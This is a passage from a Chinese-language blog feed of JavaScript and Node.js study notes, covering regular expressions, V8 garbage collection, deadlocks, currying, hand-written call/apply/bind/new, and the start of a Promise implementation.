<li>乍一想可以用 includes 方法实现<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (str.includes(&apos;answer-btn&apos;) &amp;&amp; str.includes(&apos;x9&apos;)) &#123;</span><br><span class="line">    // 执行操作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>但明显逻辑不严谨，如果字符串的复杂性足够大，那个包含”answer-btn” 和 “x9”但有不是 class 的情况很容易出现</p>
<ul>
<li>此时最优方案明显是正则表达式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><ol>
<li><p>正则表达式的匹配模式支持下列 3 个标志：<br>g：表示全局（global）模式，即模式将被应用于所有字符串，而非在发现第一个匹配项时立即停止<br>i：表示不区分大小写（case-insensitive）模式，即在确定匹配项时忽略模式与字符串的大小写<br>m：表示多行（multiline）模式，即在到达一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项。</p>
</li>
<li><p>模式中所有元字符都必须转义，正则中的元字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( [ &#123; \ ^ $ | ) ? * + . ] &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>特殊字符<br>所谓特殊字符就是一些有特殊含义的字符<br>?  匹配前面的字符串零次或者一次，或指明一个非贪婪限定符。要匹配 ? 字符串请使用 \?</p>
<ul>
<li>匹配前面的字符串一次或多次。默认为贪婪模式。</li>
</ul>
<p>(?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用’或’字符(|)来组合一个模式的各个部分是很有用的。例如 industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简洁的表达式。</p>
<p>.  (小数点）匹配除换行符之外的任何单个字符。<br>例如，/.n/将会匹配 “nay, an apple is on the tree” 中的 ‘an’ 和 ‘on’，但是不会匹配 ‘nay’。</p>
<ul>
<li>匹配前面的一个表达式0次或者多次，等价于{0,}。默认是贪婪的<br>例如，/bo*/会匹配 “A ghost boooooed” 中的 ‘booooo’ 和 “A bird warbled” 中的 ‘b’，但是在 “A goat grunted” 中将不会匹配任何东西</li>
</ul>
</li>
</ol>
<h3 id="常用正则"><a href="#常用正则" class="headerlink" title="常用正则"></a>常用正则</h3><ol>
<li>将 17346547310 替换为 173<em>**</em>7310<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;17346547310&quot;.replace(/(\d&#123;3&#125;)\d&#123;4&#125;(\d&#123;4&#125;)/g, &quot;$1****$2&quot;) // &quot;173****7310&quot;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>$1、$2 为正则表达式()里的内容，此处分别代表前三位和后四位</p>
<ol start="2">
<li><p>用正则获取 url 参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getQueryString(name) &#123;</span><br><span class="line">    var source = window.location.search.substr(1);</span><br><span class="line">    var reg = new RegExp(&apos;(^|&amp;)&apos; + name + &apos;=([^&amp;]*)(&amp;|$)&apos;, &apos;i&apos;);</span><br><span class="line">    var r = source.match(reg);</span><br><span class="line"></span><br><span class="line">    if (r != null) &#123;</span><br><span class="line">        return decodeURIComponent(r[2]);</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line">// &apos;(^|&amp;)&apos; 这里的引号用于拼接字符串，^|&amp; 表示字符串以空字符串或&amp;开头。</span><br><span class="line">// ([^&amp;]*) ^ 在方括号表达式中使用时表示不匹配方括号内的字符集合；这里表示不匹配 &amp;。* 表示零或多次</span><br><span class="line">// (&amp;|$) 表示以&amp;或空字符串结尾</span><br><span class="line">// i 不区分大小写</span><br><span class="line">// r[0] 为匹配到的所有字符，r[1] 为第一个()匹配的内容，r[2] 为第二个()匹配的内容即=后的结果。</span><br><span class="line">// decodeURIComponent 解析被 encodeURIComponent 的内容</span><br></pre></td></tr></table></figure>
</li>
<li><p>匹配Unicode编码中的汉字范围</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var reg = /^[\u2E80-\u9FFF]+$/;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将 ‘10000000000’ 形式的字符串, 以每3位进行分隔展示 ‘10.000.000.000’</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;10000000000&apos;.replace(/(\d)(?=(\d&#123;3&#125;)+\b)/g, &apos;$1.&apos;)</span><br><span class="line">// 定位符 \b 表示匹配一个单词边界，即字与空格间的位置。\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。</span><br><span class="line">// 非捕获元 ?=， exp1(?=exp2) 表示查找 exp2 前面的 exp1。</span><br><span class="line">// $1 这里的为 replace 的第二个参数，此参数为字符串参数，$n 为100以内的正整数，为特殊变量。表示第 n 个括号内的匹配。</span><br></pre></td></tr></table></figure>
</li>
<li><p>替换 dom 字符串中的图片地址</p>
</li>
</ol>
<ul>
<li>向 dom 字符串中的 background-image url() 和 img src 追加参数。（使用jquery初始化会发送请求）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">const domStr = &apos;&lt;div class=&quot;slide &quot; style=&quot;width: 1200px; height: 900px; background: url(&amp;quot;https://storage.aixuexi.com/u/89JTeFCY291?imageView2/2/w/1000/q/50&amp;amp;ps=-s25q25&amp;quot;) center center / cover no-repeat;&quot;&gt;&lt;div class=&quot;a0&quot;&gt;&lt;img style=&quot;width: 100%;height: 100%;&quot; src=&quot;https://storage.aixuexi.com/u/fb0NXFhfe92?ps=-s25q25&quot;&gt;&lt;/div&gt;&lt;/div&gt;&apos;</span><br><span class="line">const _quality = &apos;ps=-s25q25&apos;</span><br><span class="line"></span><br><span class="line">// 背景图</span><br><span class="line">domStr.replace(</span><br><span class="line">    /(url\(&amp;quot;)(.*?)(&amp;quot;\))/g,</span><br><span class="line">    (match, p1, p2, p3) =&gt; &#123;</span><br><span class="line">        const _p2 = `$&#123;p2&#125;$&#123;p2.includes(&apos;?&apos;) ? `&amp;amp;$&#123;_quality&#125;` : `?$&#123;_quality&#125;`&#125;`;</span><br><span class="line"></span><br><span class="line">        return `$&#123;p1&#125;$&#123;_p2&#125;$&#123;p3&#125;`;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// 图片组件</span><br><span class="line">domStr.replace(</span><br><span class="line">    /(&lt;img)(.*?)(&gt;)/g,</span><br><span class="line">    (match, p1, p2, p3) =&gt; &#123;</span><br><span class="line">        const _p2 = p2.replace(</span><br><span class="line">        /(src=&quot;)(.*?)(&quot;)/g,</span><br><span class="line">        (match, $1, $2, $3) =&gt; &#123;</span><br><span class="line">            const _$2 = `$&#123;$2&#125;$&#123;$2.includes(&apos;?&apos;) ? `&amp;$&#123;_quality&#125;` : `?$&#123;_quality&#125;`&#125;`</span><br><span class="line"></span><br><span class="line">            return `$&#123;$1&#125;$&#123;_$2&#125;$&#123;$3&#125;`</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        return `$&#123;p1&#125;$&#123;_p2&#125;$&#123;p3&#125;`;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">* ? 非贪婪限定符，保证匹配到一个 &lt;img /&gt; 标签, .* 会匹配到最后一个 &gt; 不准确</span><br><span class="line">* replace 第二个参数接受函数，需返回 string，match 参数表示当前正则所匹配到的完整字符串，p(n) 参数对应正则中的第 n 括号的内容</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="6">
<li><p>实现字符串的 trim 方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.myTrim = function() &#123;</span><br><span class="line">    return this.replace(/(^\s+)|(\s+$)/g,&apos;&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>vue 源码中的 camelize 方法(‘abce-fgh-ijk’ 转为小驼峰：’abceFghIjk’)<br>var camelize = function (str) {<br>return str.replace(/-(\w)/g, function (_, c) { return c ? c.toUpperCase() : ‘’ })<br>};</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nodejs-基础]]></title>
      <url>https://fuzhongfeng.github.io/2018/07/13/node-base/</url>
      <content type="html"><![CDATA[<h2 id="nodejs-垃圾回收机制"><a href="#nodejs-垃圾回收机制" class="headerlink" title="nodejs 垃圾回收机制"></a>nodejs 垃圾回收机制</h2><blockquote>
<p>v8 的内存使用是有限制的，64位系统下约为1.4GB，32位系统下约为0.7GB。垃圾回收机制尤为重要。</p>
<ul>
<li>内存分代：在V8中，主要将内存分为新生代和老生代两代。新生代中的对象为存活时间较短的对象，<br>老生代中的对象为存活时间较长或常驻内存的对象。</li>
</ul>
</blockquote>
<ol>
<li>Scavenge 算法</li>
</ol>
<ul>
<li>在分代的基础上，新生代中的对象主要通过Scavenge算法进行垃圾回收</li>
</ul>
<ol start="2">
<li>V8在老生代中主要采 用了Mark-Sweep和Mark-Compact相结合的方式进行垃圾回收。Mark-Sweep是标记清除的意思。Mark-Compact是标记整理的意思。由于Mark-Compact需要移动对象， 所以它的执行速度不可能很快，所以在取舍上，V8主要使用Mark-Sweep，在空间不足以对从新 生代中晋升过来的对象进行分配时才使用Mark-Compact。</li>
</ol>
<h2 id="nodejs-事件循环"><a href="#nodejs-事件循环" class="headerlink" title="nodejs 事件循环"></a>nodejs 事件循环</h2><p><a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/#setimmediate-vs-settimeout" target="_blank" rel="noopener">https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/#setimmediate-vs-settimeout</a></p>
<h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><blockquote>
<p>死锁是指两个或两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去</p>
</blockquote>
<p>产生死锁的四个必要条件：</p>
<ul>
<li>不可剥夺条件：进程所获得的资源在未使用完毕之前，不能被其他进程强行夺走，即只能由占用该资源的进程自己来释放。</li>
<li>互斥条件：一段时间内某资源只由一个进程占用。如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程释放。</li>
<li>请求与保持条件：进程已经保持了至少一个资源，但又提出了新的资源请求而该资源已被其他进程占有，此时请求进程被阻塞，但对已获得的资源保持不放。</li>
<li>循环等待条件：指在发生死锁时，必然存在一个进程之间资源的循环调用，即进程集合{P0，P1，P2，···，Pn}中的P0正在等待一个P1占用的资源；P1正在等待P2占用的资源，···，Pn正在等待已被P0占用的资源。</li>
</ul>
<h2 id="nodejs-调试"><a href="#nodejs-调试" class="headerlink" title="nodejs 调试"></a>nodejs 调试</h2><h3 id="一、vscode"><a href="#一、vscode" class="headerlink" title="一、vscode"></a>一、vscode</h3><p><img src="/2018/07/13/node-base/step1.png" alt="step1"><br><img src="/2018/07/13/node-base/step2.png" alt="step2-3"></p>
<ul>
<li>此时项目根目录下会创建出 .vscode/launch.json文件</li>
</ul>
<p><img src="/2018/07/13/node-base/step3.png" alt="step4-5"><br><img src="/2018/07/13/node-base/step4.png" alt="step6"></p>
<ul>
<li>访问node服务即可触发断点进行调试</li>
</ul>
<p><img src="/2018/07/13/node-base/step5.png" alt="step7"></p>
]]></content>
      
        <categories>
            
            <category> Nodejs </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Nodejs </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-基础]]></title>
      <url>https://fuzhongfeng.github.io/2018/06/28/javascript-base/</url>
      <content type="html"><![CDATA[<h2 id="null-和-0-比较"><a href="#null-和-0-比较" class="headerlink" title="null 和 0 比较"></a>null 和 0 比较</h2><p><em>最近在项目中修改 bug 时发现的一个不太理解的问题：</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">params.estimatedStudentTime = values.estimatedStudentTime &gt;= 0 ? </span><br><span class="line">    values.estimatedStudentTime : -1</span><br></pre></td></tr></table></figure>
<p>本意是想根据 values.estimatedStudentTime 的值如果存在并且值大于等于零时才赋值给 params.estimatedStudentTime，当 values.estimatedStudentTime 的值不存在时则取 -1 再传递给接口。<br>乍一看判断没问题啊，然而控制台却发现还是将 null 值传递了出去。因为在某一处给 values.estimatedStudentTime 赋值为 null，但是 values.estimatedStudentTime &gt;= 0 为什么不能过滤掉 null ？？？ 难道 null &gt;= 0 返回true ？？？ 果然 null &gt;= 0 返回 true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">console.log(null &gt; 0);   // false</span><br><span class="line">console.log(null &lt; 0);   // false</span><br><span class="line">console.log(null &gt;= 0);   // true</span><br><span class="line">console.log(null &lt;= 0);   // true</span><br><span class="line">console.log(null == 0);   // false</span><br><span class="line">console.log(null === 0);    // false</span><br></pre></td></tr></table></figure></p>
<p>why ？？？<br>首先明确概念：<br>关系运算符： &lt;、&gt;、&gt;=、&lt;=<br>相等运算符：==、!=、===、!==</p>
<h3 id="关系运算符比较时会尝试将值转为-number-，Number-null-值为-0"><a href="#关系运算符比较时会尝试将值转为-number-，Number-null-值为-0" class="headerlink" title="关系运算符比较时会尝试将值转为 number ，Number(null)  值为 0"></a>关系运算符比较时会尝试将值转为 number ，Number(null)  值为 0</h3><p>然而 Number(undefined) 值却为 NaN, NaN &gt;= 0 返回 false</p>
<h2 id="函数柯里化"><a href="#函数柯里化" class="headerlink" title="函数柯里化"></a>函数柯里化</h2><ul>
<li>创建方式：调用另一个函数并为它传入要柯里化的函数和必要参数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function curry(fn)&#123;</span><br><span class="line">  var args = Array.prototype.slice.call(arguments, 1);</span><br><span class="line">  return function()&#123;</span><br><span class="line">      var innerArgs = Array.prototype.slice.call(arguments);</span><br><span class="line">      var finalArgs = args.concat(innerArgs);</span><br><span class="line">      return fn.apply(null, finalArgs);</span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br><span class="line">function add(num1, num2)&#123; // 柯里化的函数</span><br><span class="line">    return num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line">var curriedAdd = curry(add, 5);</span><br><span class="line">curriedAdd(3) // 8</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>*问题1：实现一个 fn 函数返回如下结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fn(&apos;a&apos;, &apos;b&apos;, &apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br><span class="line">fn(&apos;a&apos;, &apos;b&apos;)(&apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br><span class="line">fn(&apos;a&apos;)(&apos;b&apos;)(&apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br><span class="line">fn(&apos;a&apos;)(&apos;b&apos;, &apos;c&apos;) // [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]</span><br></pre></td></tr></table></figure></p>
<p>函数式 柯里化解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function add (a, b, c) &#123;</span><br><span class="line">    console.log([a, b, c])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 第一种</span><br><span class="line">function curry(func) &#123;</span><br><span class="line">    var argLen = func.length // 函数参数的个数</span><br><span class="line"></span><br><span class="line">    return function _fn(...rest) &#123;</span><br><span class="line">         if(rest.length &lt; argLen) &#123;</span><br><span class="line">           return _fn.bind(null, ...rest)</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             return func.apply(null, rest)   </span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 第二种</span><br><span class="line">function curry(fn) &#123;</span><br><span class="line">    var len = fn.length;</span><br><span class="line"></span><br><span class="line">    return function _f() &#123;</span><br><span class="line">        if (arguments.length === len) &#123;</span><br><span class="line">            return fn.apply(null, arguments)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return _f.bind(null, ...arguments)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var fn = curry(add)</span><br></pre></td></tr></table></figure></p>
<h2 id="实现-Function-prototype-call"><a href="#实现-Function-prototype-call" class="headerlink" title="实现 Function.prototype.call"></a>实现 Function.prototype.call</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.myCall = function(obj, ...args) &#123;</span><br><span class="line">    if (typeof this !== &apos;function&apos;) throw new Error(&apos;type error&apos;)</span><br><span class="line"></span><br><span class="line">    // 默认值 window</span><br><span class="line">    obj = obj || window</span><br><span class="line"></span><br><span class="line">    // 防止覆盖 obj 已有 fn 属性</span><br><span class="line">    const _fn = Symbol(&apos;fn&apos;)</span><br><span class="line"></span><br><span class="line">    // call 位于函数实例的原型上，因此调用时 call 函数内的 this 指向函数实例自身</span><br><span class="line">    obj[_fn] = this</span><br><span class="line"></span><br><span class="line">    const _result = obj[_fn](...args)</span><br><span class="line">    delete obj[_fn]</span><br><span class="line">    </span><br><span class="line">    return _result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>测试一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &apos;fu&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() &#123;</span><br><span class="line">    console.log(this.name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test() // undefined</span><br><span class="line">test.call(o) // &apos;fu&apos;</span><br><span class="line">test.myCall(o) // &apos;fu&apos;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="实现-Function-prototype-apply"><a href="#实现-Function-prototype-apply" class="headerlink" title="实现 Function.prototype.apply"></a>实现 Function.prototype.apply</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.myApply = function(obj, args) &#123;</span><br><span class="line">    if (typeof this !== &apos;function&apos;) throw new Error(&apos;type error&apos;)</span><br><span class="line"></span><br><span class="line">    // 默认值 window</span><br><span class="line">    obj = obj || window</span><br><span class="line"></span><br><span class="line">    // 防止覆盖 obj 已有 fn 属性</span><br><span class="line">    const _fn = Symbol(&apos;fn&apos;)</span><br><span class="line"></span><br><span class="line">    // call 位于函数实例的原型上，因此调用时 call 函数内的 this 指向函数实例自身</span><br><span class="line">    obj[_fn] = this</span><br><span class="line"></span><br><span class="line">    const _result = obj[_fn](...args)</span><br><span class="line">    delete obj[_fn]</span><br><span class="line">    </span><br><span class="line">    return _result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>测试一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &apos;fu&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test(...args) &#123;</span><br><span class="line">    console.log(this.name, ...args)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr = [1,2,3]</span><br><span class="line"></span><br><span class="line">test(arr) // [1,2,3]</span><br><span class="line">test.apply(o) // &apos;fu&apos; 1,2,3</span><br><span class="line">test.myApply(o) // &apos;fu&apos; 1,2,3</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="实现-Function-prototype-bind"><a href="#实现-Function-prototype-bind" class="headerlink" title="实现 Function.prototype.bind"></a>实现 Function.prototype.bind</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.myBind = function (thisArg, ...args) &#123;</span><br><span class="line">    if (typeof this !== &quot;function&quot;) &#123;</span><br><span class="line">      throw Error(&quot;type error&quot;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var self = this</span><br><span class="line">    var fn = function () &#123;</span><br><span class="line">        self.apply(this instanceof self ? this : thisArg, args.concat(Array.prototype.slice.call(arguments)))</span><br><span class="line">    &#125;</span><br><span class="line">    // 继承原型上的属性和方法</span><br><span class="line">    fn.prototype = Object.create(self.prototype);</span><br><span class="line"></span><br><span class="line">    return fn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>测试一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &apos;fu&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test(...args) &#123;</span><br><span class="line">    console.log(this.name, args)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var t = test.myBind(o, 1,2,3)</span><br><span class="line"></span><br><span class="line">t() // fu [1,2,3]</span><br><span class="line">t(4) // fu [1,2,3,4]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="new-操作符"><a href="#new-操作符" class="headerlink" title="new 操作符"></a>new 操作符</h2><ul>
<li>new 操作符都做了什么？</li>
</ul>
<ol>
<li>在内存中创建一个新对象</li>
<li>这个新对象内部的[[Prototype]]特性被赋值为构造函数的 prototype 属性</li>
<li>构造函数内部的 this 被赋值为这个新对象（即this指向新对象）</li>
<li>执行构造函数内部的代码（给新对象添加属性）</li>
<li>如果构造函数返回非空对象，则返回该对象；否则，返回刚创建的新对象。</li>
</ol>
<ul>
<li>实现一个 new<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * </span><br><span class="line"> * @param &#123;*&#125; constructor 第一个参数为</span><br><span class="line"> */</span><br><span class="line">var newFactory = function() &#123;</span><br><span class="line">  var obj = &#123;&#125;;</span><br><span class="line">  var Con = [].shift.apply(arguments);</span><br><span class="line">  obj.__proto__ = Con.prototype;</span><br><span class="line">  var ret = Con.apply(obj, arguments);</span><br><span class="line">  return typeof ret === &quot;object&quot; ? ret : obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// test</span><br><span class="line">function A(name) &#123;</span><br><span class="line">  this.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(newFactory(A, &apos;fffff&apos;)) // A &#123;name: &quot;fffff&quot;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h2><ul>
<li>实现一个 promise<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">function myPromise(callback) &#123;</span><br><span class="line">  const self = this;</span><br><span class="line">  self.status = &quot;pending&quot;; // pending、resolved、rejected</span><br><span class="line">  self.value = undefined;</span><br><span class="line">  self.reason = undefined;</span><br><span class="line"></span><br><span class="line">  function resolve(value) &#123;</span><br><span class="line">    if (self.status === &quot;pending&quot;) &#123;</span><br><span class="line">      self.value = value;</span><br><span class="line">      self.status = &apos;resolved&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function reject(reason) &#123;</span><br><span class="line">    if (self.status === &quot;pending&quot;) &#123;</span><br><span class="line">      self.reason = reason;</span><br><span 